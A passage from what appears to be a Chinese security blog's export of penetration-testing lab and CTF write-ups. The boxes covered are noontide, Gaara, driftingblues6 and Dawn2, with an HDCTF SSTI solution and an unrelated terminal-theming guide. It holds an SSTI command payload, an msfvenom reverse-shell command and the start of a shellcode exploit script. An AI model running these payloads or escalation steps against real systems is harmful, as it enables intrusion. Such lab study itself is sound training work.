端口，并探测常用的20个UDP端口</p><p><img src="/img/OSCP-noontide/image-20240822125518212.png" alt="image-20240822125518212"></p><p>tcp 有几个陌生的协议，udp基本上处于全关闭状态</p><p>上网搜寻了有关IRC 协议的信息</p><blockquote><p>IRC，即Internet Relay Chat（互联网中继聊天），是一种用于在线通信的协议。它允许用户在实时环境中通过文本消息进行交流。IRC 协议最初在1988年由Jarkko Oikarinen创建，主要目的是为了提供一个多用户实时聊天系统。用户可以加入不同的“频道”或“房间”，在那里与其他人进行交流。</p></blockquote><h3 id="3、服务版本探测"><a href="#3、服务版本探测" class="headerlink" title="3、服务版本探测"></a>3、服务版本探测</h3><p><img src="/img/OSCP-noontide/image-20240822131001560.png" alt="image-20240822131001560"></p><p>给了我们IRC协议的版本信息，和一个Admin 用户和 一个邮箱，不过好像没啥用昂；推测可能的版本在 Linux 3.5或Linux 3.1 的可能性大，系统版本较低，可能存在脏牛提权</p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><p><img src="/img/OSCP-noontide/image-20240822131302680.png" alt="image-20240822131302680"></p><p>没啥消息</p><h2 id="三、IRC协议GETshell"><a href="#三、IRC协议GETshell" class="headerlink" title="三、IRC协议GETshell"></a>三、IRC协议GETshell</h2><p>有兴趣可以在在kali 中安装irrsi 的IRC 客户端工具启动</p><p><img src="/img/OSCP-noontide/image-20240822131554883.png" alt="image-20240822131554883"></p><p>第一次启动会给我们很多的信息，表示如果你是第一次使用可以去官网看一看使用手册，<code>/HELP</code>命令可以查看帮助文档。</p><p>不过我们的重点不在这里，重点是我们可以搜索有关IRC协议的漏洞</p><p><img src="/img/OSCP-noontide/image-20240822134811048.png" alt="image-20240822134811048"></p><p>在MSF中搜索有关UnrealIRCd 版本的漏洞，出来一个，表示 UnrealIRCD 3.2.8.1 存在一个命令执行的漏洞，nmap并没有探测出准确的版本号，只能尝试获取shell</p><p><img src="/img/OSCP-noontide/image-20240822135717678.png" alt="image-20240822135717678"></p><p>修改payload 载荷，配置本地监听端口</p><p><img src="/img/OSCP-noontide/image-20240822135735967.png" alt="image-20240822135735967"></p><p>尝试攻击，成功获取shell</p><p><img src="/img/OSCP-noontide/image-20240822135806481.png" alt="image-20240822135806481"></p><h2 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p>优化我们的shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line">export TERM=xterm</span><br></pre></td></tr></table></figure><p>查找信息，本以为系统版本较低，可能存在脏牛提权，但是一查看，发现版本还挺高，看来nmap有时候识别的偏差较大</p><p><img src="/img/OSCP-noontide/image-20240822142051184.png" alt="image-20240822142051184"></p><h3 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h3><p>经过一番查找，suid、sudo、计划任务均无果，在用户家目录下发现一个隐藏文件</p><p><img src="/img/OSCP-noontide/image-20240822142213554.png" alt="image-20240822142213554"></p><p>直接su 弱密码提权</p><p><img src="/img/OSCP-noontide/image-20240822142308081.png" alt="image-20240822142308081"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【其他经验】CMD终端美化记录—oh-my-posh</title>
      <link href="/2024/08/21/Extracurricular-experience-CMD-beautification/"/>
      <url>/2024/08/21/Extracurricular-experience-CMD-beautification/</url>
      
        <content type="html"><![CDATA[<h1 id="【其他经验】CMD终端美化记录—oh-my-posh"><a href="#【其他经验】CMD终端美化记录—oh-my-posh" class="headerlink" title="【其他经验】CMD终端美化记录—oh-my-posh"></a>【其他经验】CMD终端美化记录—oh-my-posh</h1><h2 id="一、安装Windows-Terminal"><a href="#一、安装Windows-Terminal" class="headerlink" title="一、安装Windows Terminal"></a>一、安装Windows Terminal</h2><h3 id="1、简单介绍下"><a href="#1、简单介绍下" class="headerlink" title="1、简单介绍下"></a><strong>1、简单介绍下</strong></h3><p>Windows Terminal 是微软开发的一款新的终端应用程序，它为命令行工具提供了一个现代化的界面。它支持 PowerShell、命令提示符（cmd）、WSL（Windows Subsystem for Linux）等多种命令行工具。Windows Terminal 不是 cmd，但它可以运行 cmd。</p><h3 id="2、下载地址"><a href="#2、下载地址" class="headerlink" title="2、下载地址"></a><strong>2、下载地址</strong></h3><p>1、微软自带的应用商店（推荐）</p><p>2、GitHub 目前最新版下载地址：<a href="https://github.com/microsoft/terminal/releases/">https://github.com/microsoft/terminal/releases/</a></p><p>这里推荐使用微软自带的应用商店下载，有些配置会默认帮我们配置好</p><h3 id="3、启动方式"><a href="#3、启动方式" class="headerlink" title="3、启动方式"></a>3、启动方式</h3><p>【win + R 输入wt 】即可启动</p><h3 id="4、配置成默认启动方式"><a href="#4、配置成默认启动方式" class="headerlink" title="4、配置成默认启动方式"></a>4、配置成默认启动方式</h3><p>在【设置】中配置默认终端应用程序，这样使用【cmd】命令即可打开该程序，右下角记得保存</p><p><img src="/img/Extracurricular-experience-CMD-beautification/image-20240821192518313.png" alt="image-20240821192518313"></p><h2 id="二、安装nerd-字体"><a href="#二、安装nerd-字体" class="headerlink" title="二、安装nerd 字体"></a>二、安装nerd 字体</h2><h3 id="1、nerd-字体介绍"><a href="#1、nerd-字体介绍" class="headerlink" title="1、nerd 字体介绍"></a><strong>1、nerd 字体介绍</strong></h3><p>因为oh-my-post 在使用中有多个特殊字符，为了不显示乱码的情况，官方推荐使用 nerd fonts 字体</p><h3 id="2、下载方式"><a href="#2、下载方式" class="headerlink" title="2、下载方式"></a><strong>2、下载方式</strong></h3><p>1、官网下载链接（推荐）：<a href="https://github.com/ryanoasis/nerd-fonts/releases/download/v3.2.1/0xProto.zip">https://github.com/ryanoasis/nerd-fonts/releases/download/v3.2.1/0xProto.zip</a></p><p>2、网上看到的百度网盘下载地址（安全性未知，请自辩）：链接：<a href="https://pan.baidu.com/s/1VAcGlRVoQeE59z73A1cEDw">百度网盘 请输入提取码</a> 提取码：uau7</p><h3 id="3、字体选择"><a href="#3、字体选择" class="headerlink" title="3、字体选择"></a><strong>3、字体选择</strong></h3><p>从官网下载的有三个字体文件，都大差不差，我选择了名称短的这个，总之感觉哪个都可以，文件的左上角有安装</p><p><img src="/img/Extracurricular-experience-CMD-beautification/image-20240821185053955.png" alt="image-20240821185053955"></p><h3 id="4、配置字体"><a href="#4、配置字体" class="headerlink" title="4、配置字体"></a><strong>4、配置字体</strong></h3><p>在【默认值】的【外观】中配置字体，注意保存</p><p><img src="/img/Extracurricular-experience-CMD-beautification/image-20240821192911748.png" alt="image-20240821192911748"></p><h2 id="三、oh-my-posh-下载安装"><a href="#三、oh-my-posh-下载安装" class="headerlink" title="三、oh-my-posh 下载安装"></a>三、oh-my-posh 下载安装</h2><h3 id="下载oh-my-posh"><a href="#下载oh-my-posh" class="headerlink" title="下载oh-my-posh"></a>下载oh-my-posh</h3><p>1、微软应用商店下载（推荐）：直接搜索oh-my-posh 就会出来</p><p>2、在Windows Terminal 中执行如下命令安装：winget install JanDeDobbeleer.OhMyPosh -s winget</p><p>3、GitHub下载，地址不贴了，自行搜索下</p><h2 id="四、美化powershell"><a href="#四、美化powershell" class="headerlink" title="四、美化powershell"></a>四、美化powershell</h2><h3 id="1、试用oh-my-posh-主题"><a href="#1、试用oh-my-posh-主题" class="headerlink" title="1、试用oh-my-posh 主题"></a>1、试用oh-my-posh 主题</h3><p>走到Terminal 的powershell 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-PoshThemes</span><br></pre></td></tr></table></figure><p>出来了很多其他的主题，在最后给了使用实例，选择一个主题，替换示例中的<code>jandedobbeleer</code>，</p><p><img src="/img/Extracurricular-experience-CMD-beautification/image-20240821205100529.png" alt="image-20240821205100529"></p><p>我在这里试用的是<code>honukai</code> 主题，则将命令修改成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oh-my-posh init pwsh --config &#x27;C:\Users\81120\AppData\Local\Programs\oh-my-posh\themes\honukai.omp.json&#x27; | Invoke-Expression</span><br></pre></td></tr></table></figure><p>可以多挑挑选选，这个只是临时的试用</p><h3 id="2、持久化保存配置"><a href="#2、持久化保存配置" class="headerlink" title="2、持久化保存配置"></a>2、持久化保存配置</h3><p>创建配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-Item -Path $PROFILE -Type File -Force</span><br></pre></td></tr></table></figure><p>编辑配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad $PROFILE</span><br></pre></td></tr></table></figure><p>将上述主题启动命令复制进去保存即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oh-my-posh init pwsh --config &#x27;C:\Users\81120\AppData\Local\Programs\oh-my-posh\themes\honukai.omp.json&#x27; | Invoke-Expression</span><br></pre></td></tr></table></figure><p>暂时美化到这里，其中Terminal 更多的配置可以按个人喜好在设置中配置</p>]]></content>
      
      
      <categories>
          
          <category> 其他经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMD美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-Gaara</title>
      <link href="/2024/08/20/OSCP-Gaara/"/>
      <url>/2024/08/20/OSCP-Gaara/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—Gaara"><a href="#OSCP系列靶机—Gaara" class="headerlink" title="OSCP系列靶机—Gaara"></a>OSCP系列靶机—Gaara</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Gaara/image-20240818171416371.png" alt="image-20240818171416371"></p><h2 id="二、端口探测"><a href="#二、端口探测" class="headerlink" title="二、端口探测"></a>二、端口探测</h2><h3 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h3><p><img src="/img/OSCP-Gaara/image-20240818171536703.png" alt="image-20240818171536703"></p><p>仅仅存在两个端口，Apache 2.4.38 存在SSRF漏洞，不知道这个靶场会不会用得上</p><h3 id="2、探测服务版本"><a href="#2、探测服务版本" class="headerlink" title="2、探测服务版本"></a>2、探测服务版本</h3><p><img src="/img/OSCP-Gaara/image-20240818172419454.png" alt="image-20240818172419454"></p><p>linux 4.x-5.x ，版本稍高，估计不存在脏牛提权漏洞</p><h3 id="3、对端口进行漏洞探测"><a href="#3、对端口进行漏洞探测" class="headerlink" title="3、对端口进行漏洞探测"></a>3、对端口进行漏洞探测</h3><p><img src="/img/OSCP-Gaara/image-20240818171936357.png" alt="image-20240818171936357"></p><p>并未有漏洞发现</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、首页源代码信息收集"><a href="#1、首页源代码信息收集" class="headerlink" title="1、首页源代码信息收集"></a>1、首页源代码信息收集</h3><p><img src="/img/OSCP-Gaara/image-20240818172219685.png" alt="image-20240818172219685"></p><p>都很保守啊，只有一张外部链接的图片，我这个靶场环境问题图片没有显示出来</p><p><img src="/img/OSCP-Gaara/image-20240818172254302.png" alt="image-20240818172254302"></p><h3 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h3><p>这里需要准备大字典才行</p><p><img src="/img/OSCP-Gaara/image-20240818174935118.png" alt="image-20240818174935118"></p><p><img src="/img/OSCP-Gaara/image-20240818175014609.png" alt="image-20240818175014609"></p><p>啥也没有，不能把，果然，页面源代码给东西了</p><p><img src="/img/OSCP-Gaara/image-20240818175039632.png" alt="image-20240818175039632"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p><img src="/img/OSCP-Gaara/image-20240818175259054.png" alt="image-20240818175259054"></p><p>似乎是三篇长的差不多的文章，简单翻译过后，在讲述某个故事</p><p>我们在三篇文章中搜索pass关键字，发现不一样的地方</p><p><img src="/img/OSCP-Gaara/image-20240818180001926.png" alt="image-20240818180001926"></p><p>尝试base64解密失败，看起来确实像base加密，尝试其他base解密</p><p><img src="/img/OSCP-Gaara/image-20240818180237934.png" alt="image-20240818180237934"></p><p>成功获取某个用户的账号密码，尝试ssh登陆</p><p><img src="/img/OSCP-Gaara/image-20240818180432566.png" alt="image-20240818180432566"></p><p>啊？密码不对，离了个大谱，尝试下爆破吧；成功爆破出来一个密码</p><p><img src="/img/OSCP-Gaara/image-20240820125758003.png" alt="image-20240820125758003"></p><p>成功Getsehll</p><p><img src="/img/OSCP-Gaara/image-20240820125910626.png" alt="image-20240820125910626"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p><img src="/img/OSCP-Gaara/image-20240820132010591.png" alt="image-20240820132010591"></p><p>给了一个提示，看一下</p><p><img src="/img/OSCP-Gaara/image-20240820132101723.png" alt="image-20240820132101723"></p><p>给AI 分析下</p><p><img src="/img/OSCP-Gaara/image-20240820132523801.png" alt="image-20240820132523801"></p><p>BF 语言写的程序，但是这个靶机似乎没有运行环境，暂时搁置</p><h3 id="2、权限提升"><a href="#2、权限提升" class="headerlink" title="2、权限提升"></a>2、权限提升</h3><p>查找高权限命令</p><p><img src="/img/OSCP-Gaara/image-20240820133020771.png" alt="image-20240820133020771"></p><p>查找gdb 提权命令，两句话提权</p><p><img src="/img/OSCP-Gaara/image-20240820133423265.png" alt="image-20240820133423265"></p><p>成功提权至root</p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—driftingblues6</title>
      <link href="/2024/07/30/OSCP-driftingblues6/"/>
      <url>/2024/07/30/OSCP-driftingblues6/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—driftingblues6"><a href="#OSCP系列靶机—driftingblues6" class="headerlink" title="OSCP系列靶机—driftingblues6"></a>OSCP系列靶机—driftingblues6</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-driftingblues6/image-20240730181037863.png" alt="image-20240730181037863"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-driftingblues6/image-20240730181110594.png" alt="image-20240730181110594"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-driftingblues6/image-20240730181503239.png" alt="image-20240730181503239"></p><p>只开放了80端口</p><p>3、服务版本扫描</p><p><img src="/img/OSCP-driftingblues6/image-20240730181515900.png" alt="image-20240730181515900"></p><p>80使用apache 2.2.22版本，算是一个低版本；使用linux 3.2-3.16的一个系统版本，这个版本也是低版本，存在可能的漏洞</p><p>4、漏洞探测</p><p><img src="/img/OSCP-driftingblues6/image-20240730182436530.png" alt="image-20240730182436530"></p><p>只做了目录扫描</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、首页和源代码"><a href="#1、首页和源代码" class="headerlink" title="1、首页和源代码"></a>1、首页和源代码</h3><p><img src="/img/OSCP-driftingblues6/image-20240730181243631.png" alt="image-20240730181243631"></p><p><img src="/img/OSCP-driftingblues6/image-20240730181303628.png" alt="image-20240730181303628"></p><p>在源代码中发现了一些东西，不过对这个靶场似乎没什么作用</p><h3 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h3><p><img src="/img/OSCP-driftingblues6/image-20240730181838025.png" alt="image-20240730181838025"></p><p>出来一些有趣的文件和文件夹</p><p><img src="/img/OSCP-driftingblues6/image-20240730182549959.png" alt="image-20240730182549959"></p><p>并且给了我们一个重要的提示，<code>.zip</code></p><h3 id="3、指定后缀扫描"><a href="#3、指定后缀扫描" class="headerlink" title="3、指定后缀扫描"></a>3、指定后缀扫描</h3><p><img src="/img/OSCP-driftingblues6/image-20240730185532900.png" alt="image-20240730185532900"></p><p>扫到一个之前没扫到的家伙</p><p><img src="/img/OSCP-driftingblues6/image-20240730202032703.png" alt="image-20240730202032703"></p><h3 id="4、spammer-zip"><a href="#4、spammer-zip" class="headerlink" title="4、spammer.zip"></a>4、spammer.zip</h3><p><img src="/img/OSCP-driftingblues6/image-20240730185930263.png" alt="image-20240730185930263"></p><p>需要密码，做hash转换和破解</p><p><img src="/img/OSCP-driftingblues6/image-20240730185948589.png" alt="image-20240730185948589"></p><p>给到密码</p><p><img src="/img/OSCP-driftingblues6/image-20240730190030543.png" alt="image-20240730190030543"></p><p>似乎是一组账号密码</p><h3 id="5、textpattern登陆后台"><a href="#5、textpattern登陆后台" class="headerlink" title="5、textpattern登陆后台"></a>5、textpattern登陆后台</h3><p><img src="/img/OSCP-driftingblues6/image-20240730182933263.png" alt="image-20240730182933263"></p><p>输入账号密码，成功登陆后台</p><p><img src="/img/OSCP-driftingblues6/image-20240730201935141.png" alt="image-20240730201935141"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><h3 id="1、漏洞查询"><a href="#1、漏洞查询" class="headerlink" title="1、漏洞查询"></a>1、漏洞查询</h3><p>进来之后，在下面能看到当前cms 的版本号</p><p><img src="/img/OSCP-driftingblues6/image-20240730202556693.png" alt="image-20240730202556693"></p><p>查找漏洞</p><p><img src="/img/OSCP-driftingblues6/image-20240730202625552.png" alt="image-20240730202625552"></p><p>这俩都是相当不错的，进行尝试；首先尝试第一个</p><p>脚本内给出了使用方法</p><p><img src="/img/OSCP-driftingblues6/image-20240730202720117.png" alt="image-20240730202720117"></p><p>尝试执行，似乎执行失败了，提示文件上传是None</p><p><img src="/img/OSCP-driftingblues6/image-20240730203205877.png" alt="image-20240730203205877"></p><p>再次查看使用方法，依然出错</p><p><img src="/img/OSCP-driftingblues6/image-20240730214524552.png" alt="image-20240730214524552"></p><h3 id="2、后台上传文件getshell"><a href="#2、后台上传文件getshell" class="headerlink" title="2、后台上传文件getshell"></a>2、后台上传文件getshell</h3><p>最终去后台找漏洞点了，成功上传shell.php</p><p><img src="/img/OSCP-driftingblues6/image-20240730214657701.png" alt="image-20240730214657701"></p><p>之前做目录扫描，发现有<code>files</code>的目录，查看一下</p><p><img src="/img/OSCP-driftingblues6/image-20240730214745282.png" alt="image-20240730214745282"></p><p>OK，好极了，反弹shell</p><p><img src="/img/OSCP-driftingblues6/image-20240730214944409.png" alt="image-20240730214944409"></p><p>成功反弹shell</p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p><img src="/img/OSCP-driftingblues6/image-20240730215555584.png" alt="image-20240730215555584"></p><p>果然，版本很低，尝试脏牛提权</p><h3 id="2、脏牛提权"><a href="#2、脏牛提权" class="headerlink" title="2、脏牛提权"></a>2、脏牛提权</h3><p>搜索一下</p><p><img src="/img/OSCP-driftingblues6/image-20240730220405248.png" alt="image-20240730220405248"></p><p>这里使用之前用到过的 40839.c 这个脚本</p><p><img src="/img/OSCP-driftingblues6/image-20240730221504186.png" alt="image-20240730221504186"></p><p>成功添加上了，su到这个用户，成功root</p><p><img src="/img/OSCP-driftingblues6/image-20240730221543070.png" alt="image-20240730221543070"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF竞赛】[HDCTF 2023]SearchMaster—SSTI注入</title>
      <link href="/2024/07/28/CTF-competition-SSTI-injection/"/>
      <url>/2024/07/28/CTF-competition-SSTI-injection/</url>
      
        <content type="html"><![CDATA[<h1 id="HDCTF-2023-SearchMaster—SSTI注入"><a href="#HDCTF-2023-SearchMaster—SSTI注入" class="headerlink" title="[HDCTF 2023]SearchMaster—SSTI注入"></a>[HDCTF 2023]SearchMaster—SSTI注入</h1><h2 id="一、看题"><a href="#一、看题" class="headerlink" title="一、看题"></a>一、看题</h2><p><img src="/img/CTF-competition-SSTI-injection/image-20240728194430099.png" alt="image-20240728194430099"></p><p>页面很干净，什么信息几乎都收集不到，但是给了一个<code>BUT YOU CAN POST ME A DATA</code>的提示，想让我们给他一个post 的data请求</p><h2 id="二、解题"><a href="#二、解题" class="headerlink" title="二、解题"></a>二、解题</h2><h3 id="1、POST请求"><a href="#1、POST请求" class="headerlink" title="1、POST请求"></a>1、POST请求</h3><p>那我们给他一个POST请求</p><p><img src="/img/CTF-competition-SSTI-injection/image-20240728194604129.png" alt="image-20240728194604129"></p><p>发现我们给他什么，他就输出什么</p><h3 id="2、验证SSTI注入漏洞"><a href="#2、验证SSTI注入漏洞" class="headerlink" title="2、验证SSTI注入漏洞"></a>2、验证SSTI注入漏洞</h3><p><img src="/img/CTF-competition-SSTI-injection/image-20240728194733538.png" alt="image-20240728194733538"></p>49做了执行，变成了49，证明存在SSTI注入<h3 id="3、验证是否是-Jinja2-模块"><a href="#3、验证是否是-Jinja2-模块" class="headerlink" title="3、验证是否是 Jinja2 模块"></a>3、验证是否是 Jinja2 模块</h3><p>只需要做<code>&#123;&#123;7*'7'&#125;&#125;</code>，返回7777777表示是 Jinja2 模块</p><blockquote><p>Jinja2 模块表示后端是Python</p><p>Twig 模块表示后端是PHP</p><p>当然，除此之外也可以用其他方法判断后端语言</p></blockquote><p><img src="/img/CTF-competition-SSTI-injection/image-20240728195206648.png" alt="image-20240728195206648"></p><p>判断是Twig 模块，表示后端是PHP</p><h3 id="4、解题"><a href="#4、解题" class="headerlink" title="4、解题"></a>4、解题</h3><p>直接一步到位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#x27;ls&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/CTF-competition-SSTI-injection/image-20240728200824653.png" alt="image-20240728200824653"></p><h3 id="5、题解之外"><a href="#5、题解之外" class="headerlink" title="5、题解之外"></a>5、题解之外</h3><p> 如果是Jinja2 模块，推荐使用焚靖工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing webui</span><br></pre></td></tr></table></figure><p><img src="/img/CTF-competition-SSTI-injection/image-20240728195435863.png" alt="image-20240728195435863"></p><p>在左侧选择post请求方式，表单和模板环境，即可执行，之后在下面执行命令即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-Dawn2</title>
      <link href="/2024/07/28/OSCP-Dawn2/"/>
      <url>/2024/07/28/OSCP-Dawn2/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—dawn2"><a href="#OSCP系列靶机—dawn2" class="headerlink" title="OSCP系列靶机—dawn2"></a>OSCP系列靶机—dawn2</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Dawn2/image-20240726205020608.png" alt="image-20240726205020608"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-Dawn2/image-20240726205044350.png" alt="image-20240726205044350"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-Dawn2/image-20240726205254304.png" alt="image-20240726205254304"></p><p>3、服务版本探测</p><p><img src="/img/OSCP-Dawn2/image-20240726205342068.png" alt="image-20240726205342068"></p><p>4、漏洞探测</p><p><img src="/img/OSCP-Dawn2/image-20240726205652735.png" alt="image-20240726205652735"></p><p>几乎没什么发现</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、首页及源代码"><a href="#1、首页及源代码" class="headerlink" title="1、首页及源代码"></a>1、首页及源代码</h3><p><img src="/img/OSCP-Dawn2/image-20240726205552603.png" alt="image-20240726205552603"></p><p>这里给了一个zip 的压缩包</p><p><img src="/img/OSCP-Dawn2/image-20240726205628385.png" alt="image-20240726205628385"></p><h3 id="2、dawn-zip信息收集"><a href="#2、dawn-zip信息收集" class="headerlink" title="2、dawn.zip信息收集"></a>2、dawn.zip信息收集</h3><p><img src="/img/OSCP-Dawn2/image-20240726205746749.png" alt="image-20240726205746749"></p><p>有个exe跟<code>README.txt</code>文件</p><p><img src="/img/OSCP-Dawn2/image-20240726205848246.png" alt="image-20240726205848246"></p><p>昂？DAWN Multi 服务的客户端；由于是exe，放在我的本机尝试执行</p><p><img src="/img/OSCP-Dawn2/image-20240726210314566.png" alt="image-20240726210314566"></p><p>没懂啥意思，查了一下DAWN Multi Server 的相关信息</p><blockquote><p>DAWN Multi Server 是一个多功能服务器解决方案，具备多种服务功能。以下是一些关键点：</p><ol><li><strong>邮件服务器</strong>：提供企业邮局服务。</li><li><strong>DNS服务器</strong>：负责域名解析。</li><li><strong>FTP服务器</strong>：用于文件传输。</li><li><strong>路由器和NAT防火墙</strong>：提供网络路由和安全防护。</li><li><strong>DHCP服务器</strong>：动态分配IP地址。</li><li><strong>网站服务器</strong>：支持PHP和MySQL，可以搭建网站。</li><li><strong>代理服务器</strong>：提供网络代理服务。</li><li><strong>NFS网络文件服务器</strong>：用于文件共享。</li><li><strong>Samba跨平台文件服务器</strong>：支持跨平台文件共享。</li><li><strong>BBS网站</strong>：提供论坛服务，架构为PHP+MySQL。</li></ol></blockquote><p>搜索一下有关该服务的漏洞</p><p><img src="/img/OSCP-Dawn2/image-20240726211234318.png" alt="image-20240726211234318"></p><p>在查看链接之后，很显然不是我们需要的</p><h3 id="3、目录扫描"><a href="#3、目录扫描" class="headerlink" title="3、目录扫描"></a>3、目录扫描</h3><p><img src="/img/OSCP-Dawn2/image-20240726210743593.png" alt="image-20240726210743593"></p><p>啥也没</p><h3 id="4、dawn-exe折腾"><a href="#4、dawn-exe折腾" class="headerlink" title="4、dawn.exe折腾"></a>4、dawn.exe折腾</h3><p>最后还是回归这个dawn.exe</p><p><img src="/img/OSCP-Dawn2/image-20240726212120572.png" alt="image-20240726212120572"></p><p>他一直处于一种监听的模式，尝试用nc 去连接他；我们需要知道它监听的端口是哪个，这个查找方式有很多</p><p><img src="/img/OSCP-Dawn2/image-20240726212528625.png" alt="image-20240726212528625"></p><p>找到这个程序将会监听在1985，而凑巧的是，靶机的这个端口开放且在监听；使用nc 尝试端口连接</p><p><img src="/img/OSCP-Dawn2/image-20240726212827414.png" alt="image-20240726212827414"></p><p>似乎有反应，尝试编写脚本</p><p><img src="/img/OSCP-Dawn2/image-20240726215142768.png" alt="image-20240726215142768"></p><p>噢，有点反应，继续尝试；继续尝试，发现它经常性的卡壳，就如同<code>README.txt</code>写的那样</p><p><img src="/img/OSCP-Dawn2/image-20240726220500965.png" alt="image-20240726220500965"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>最后我们需要搞出来msf 的payload，之后去加载执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.101 LPORT=8888 -f c -b &#x27;\x00&#x27; EXITFUNC=thread</span><br></pre></td></tr></table></figure><p>payload，替换buff和ip、端口即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buff = (&quot;\xda\xde\xd9\x74\x24\xf4\x58\xbe\x7f\x77\xb1\x99\x2b\xc9&quot;</span><br><span class="line">&quot;\xb1\x12\x31\x70\x17\x03\x70\x17\x83\x97\x8b\x53\x6c\x56&quot;</span><br><span class="line">&quot;\xaf\x63\x6c\xcb\x0c\xdf\x19\xe9\x1b\x3e\x6d\x8b\xd6\x41&quot;</span><br><span class="line">&quot;\x1d\x0a\x59\x7e\xef\x2c\xd0\xf8\x16\x44\x23\x52\xd0\xf1&quot;</span><br><span 